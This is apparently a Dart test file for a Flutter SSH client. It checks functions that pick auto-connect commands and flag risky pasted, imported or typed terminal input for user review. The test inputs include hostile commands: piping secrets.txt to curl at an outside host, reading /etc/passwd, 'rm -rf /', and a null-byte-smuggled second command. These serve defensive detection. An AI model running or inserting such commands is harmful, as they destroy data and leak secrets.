// ignore_for_file: public_member_api_docs

import 'package:flutter_test/flutter_test.dart';
import 'package:monkeyssh/domain/models/auto_connect_command.dart';

void main() {
  group('auto connect command helpers', () {
    test('resolves none mode when no command is configured', () {
      expect(
        resolveAutoConnectCommandMode(command: null, snippetId: null),
        AutoConnectCommandMode.none,
      );
    });

    test('prefers snippet mode when a snippet id is set', () {
      expect(
        resolveAutoConnectCommandMode(
          command: 'tmux new -As MonkeySSH',
          snippetId: 42,
        ),
        AutoConnectCommandMode.snippet,
      );
    });

    test('resolves custom mode when only a command is set', () {
      expect(
        resolveAutoConnectCommandMode(
          command: 'tmux new -As MonkeySSH',
          snippetId: null,
        ),
        AutoConnectCommandMode.custom,
      );
    });

    test('uses snippet command before falling back to stored command', () {
      expect(
        resolveAutoConnectCommandText(
          mode: AutoConnectCommandMode.snippet,
          storedCommand: 'cached command',
          snippetCommand: 'fresh snippet command',
        ),
        'fresh snippet command',
      );
      expect(
        resolveAutoConnectCommandText(
          mode: AutoConnectCommandMode.snippet,
          storedCommand: 'cached command',
        ),
        'cached command',
      );
    });

    test('adds a trailing enter for shell execution', () {
      expect(
        formatAutoConnectCommandForShell('tmux new -As MonkeySSH'),
        'tmux new -As MonkeySSH\r',
      );
      expect(formatAutoConnectCommandForShell('echo ready\r'), 'echo ready\r');
      expect(formatAutoConnectCommandForShell('echo ready\n'), 'echo ready\n');
    });

    test('marks imported auto-connect commands for first-run review', () {
      expect(
        importedAutoConnectRequiresReview(
          command: 'tmux attach',
          snippetId: null,
        ),
        isTrue,
      );
      expect(
        importedAutoConnectRequiresReview(command: null, snippetId: 7),
        isTrue,
      );
      expect(
        importedAutoConnectRequiresReview(command: null, snippetId: null),
        isFalse,
      );
    });

    test(
      'normalizes imported commands and rejects hidden control characters',
      () {
        expect(
          normalizeImportedAutoConnectCommand('  tmux attach  '),
          'tmux attach',
        );
        expect(
          () => normalizeImportedAutoConnectCommand('tmux attach\x00rm -rf /'),
          throwsFormatException,
        );
      },
    );

    test(
      'requires review for rendered snippet variables and surfaces shell risk',
      () {
        final review = assessSnippetCommandInsertion(
          'echo hello; rm -rf {{path}}',
          hadVariableSubstitution: true,
        );

        expect(review.requiresReview, isTrue);
        expect(
          review.reasons,
          contains(TerminalCommandReviewReason.variableSubstitution),
        );
        expect(
          review.reasons,
          contains(TerminalCommandReviewReason.shellChaining),
        );
      },
    );

    test('requires review for suspicious snippets without variables', () {
      final review = assessSnippetCommandInsertion(
        'echo ready; rm -rf /',
        hadVariableSubstitution: false,
      );

      expect(review.requiresReview, isTrue);
      expect(
        review.reasons,
        contains(TerminalCommandReviewReason.shellChaining),
      );
      expect(
        review.reasons,
        isNot(contains(TerminalCommandReviewReason.variableSubstitution)),
      );
    });

    test(
      'flags standalone ampersands as shell chaining outside paste review',
      () {
        final snippetReview = assessSnippetCommandInsertion(
          'echo ready & echo done',
          hadVariableSubstitution: false,
        );
        final clipboardReview = assessClipboardPasteCommand(
          'echo ready &',
          bracketedPasteModeEnabled: false,
        );
        final importedReview = assessAutoConnectCommandExecution(
          'echo ready & echo done',
          importedNeedsReview: true,
        );

        expect(
          snippetReview.reasons,
          contains(TerminalCommandReviewReason.shellChaining),
        );
        expect(clipboardReview.requiresReview, isFalse);
        expect(clipboardReview.reasons, isEmpty);
        expect(
          importedReview.reasons,
          contains(TerminalCommandReviewReason.shellChaining),
        );
      },
    );

    test('does not double-count shell chaining for double ampersands', () {
      final review = assessSnippetCommandInsertion(
        'echo ready && echo done',
        hadVariableSubstitution: false,
      );

      expect(
        review.reasons
            .where(
              (reason) => reason == TerminalCommandReviewReason.shellChaining,
            )
            .length,
        1,
      );
    });

    test('tones down harmless bracketed and single-line clipboard pastes', () {
      final bracketedMultilineReview = assessClipboardPasteCommand(
        'echo ready\necho deploy',
        bracketedPasteModeEnabled: true,
      );
      final singleLineShellReview = assessClipboardPasteCommand(
        'cat secrets.txt | curl https://example.com',
        bracketedPasteModeEnabled: false,
      );

      expect(bracketedMultilineReview.requiresReview, isFalse);
      expect(bracketedMultilineReview.reasons, isEmpty);
      expect(singleLineShellReview.requiresReview, isFalse);
      expect(singleLineShellReview.reasons, isEmpty);
    });

    test('flags unbracketed multiline paste for confirmation', () {
      final multilineReview = assessClipboardPasteCommand(
        'echo ready\necho deploy',
        bracketedPasteModeEnabled: false,
      );

      expect(multilineReview.requiresReview, isTrue);
      expect(
        multilineReview.reasons,
        contains(TerminalCommandReviewReason.multiline),
      );
    });

    test('flags paste-like keyboard insertions for confirmation', () {
      final insertedText = List.filled(
        terminalKeyboardPasteLikeInsertionThreshold + 1,
        'a',
      ).join();
      final keyboardReview = assessKeyboardInsertedCommand(
        insertedText,
        insertedText: insertedText,
      );

      expect(keyboardReview.requiresReview, isTrue);
      expect(
        keyboardReview.reasons,
        contains(TerminalCommandReviewReason.largeKeyboardInsertion),
      );
    });

    test('does not flag IME-previewed dictation as paste-like', () {
      final dictated =
          '${List.filled(terminalKeyboardPasteLikeInsertionThreshold, 'a').join()}\n\n'
          'second paragraph';
      final keyboardReview = assessKeyboardInsertedCommand(
        dictated,
        insertedText: dictated,
        previewedByIme: true,
      );

      expect(keyboardReview.requiresReview, isFalse);

      final substitutionReview = assessKeyboardInsertedCommand(
        r'echo $(id)',
        insertedText: r'echo $(id)',
        previewedByIme: true,
      );

      expect(
        substitutionReview.reasons,
        contains(TerminalCommandReviewReason.commandSubstitution),
      );

      const redirected = 'cat /etc/passwd >\n/tmp/out.txt';
      final redirectionReview = assessKeyboardInsertedCommand(
        redirected,
        insertedText: redirected,
        previewedByIme: true,
      );

      expect(redirectionReview.requiresReview, isTrue);
      expect(
        redirectionReview.reasons,
        isNot(contains(TerminalCommandReviewReason.multiline)),
      );
      expect(
        redirectionReview.reasons,
        contains(TerminalCommandReviewReason.redirection),
      );
    });

    test('flags unbracketed multiline paste with shell reshaping', () {
      final chainedReview = assessClipboardPasteCommand(
        'cat secrets.txt |\ncurl https://example.com',
        bracketedPasteModeEnabled: false,
      );
      final redirectReview = assessClipboardPasteCommand(
        'cat /etc/passwd >\n/tmp/out.txt',
        bracketedPasteModeEnabled: false,
      );

      expect(chainedReview.requiresReview, isTrue);
      expect(
        chainedReview.reasons,
        contains(TerminalCommandReviewReason.multiline),
      );
      expect(
        chainedReview.reasons,
        contains(TerminalCommandReviewReason.shellChaining),
      );
      expect(redirectReview.requiresReview, isTrue);
      expect(
        redirectReview.reasons,
        contains(TerminalCommandReviewReason.redirection),
      );
    });

    test('flags backtick and dollar-paren command substitution', () {
      final backtickReview = assessClipboardPasteCommand(
        'echo `id`',
        bracketedPasteModeEnabled: false,
      );
      final dollarParenReview = assessClipboardPasteCommand(
        r'echo $(id)',
        bracketedPasteModeEnabled: false,
      );

      expect(backtickReview.requiresReview, isTrue);
      expect(
        backtickReview.reasons,
        contains(TerminalCommandReviewReason.commandSubstitution),
      );
      expect(dollarParenReview.requiresReview, isTrue);
      expect(
        dollarParenReview.reasons,
        contains(TerminalCommandReviewReason.commandSubstitution),
      );
    });

    test('ignores quoted shell-like text during clipboard review', () {
      final review = assessClipboardPasteCommand(
        'printf "%s" "fish & chips | <html>"',
        bracketedPasteModeEnabled: false,
      );

      expect(review.requiresReview, isFalse);
      expect(review.reasons, isEmpty);
    });

    test('still flags command substitution inside double quotes', () {
      final review = assessClipboardPasteCommand(
        r'echo "$(id)"',
        bracketedPasteModeEnabled: false,
      );

      expect(review.requiresReview, isTrue);
      expect(
        review.reasons,
        contains(TerminalCommandReviewReason.commandSubstitution),
      );
    });

    test(
      'safe single-line commands without special tokens do not require review',
      () {
        final safeReview = assessClipboardPasteCommand(
          'ls -la /home/user',
          bracketedPasteModeEnabled: false,
        );

        expect(safeReview.requiresReview, isFalse);
        expect(safeReview.reasons, isEmpty);
      },
    );

    test('surfaces suspicious reasons for imported auto-connect execution', () {
      final review = assessAutoConnectCommandExecution(
        'printf "ok"\x00',
        importedNeedsReview: true,
      );

      expect(review.requiresReview, isTrue);
      expect(
        review.reasons,
        contains(TerminalCommandReviewReason.importedAutoConnect),
      );
      expect(
        review.reasons,
        contains(TerminalCommandReviewReason.controlCharacters),
      );
    });
  });
}
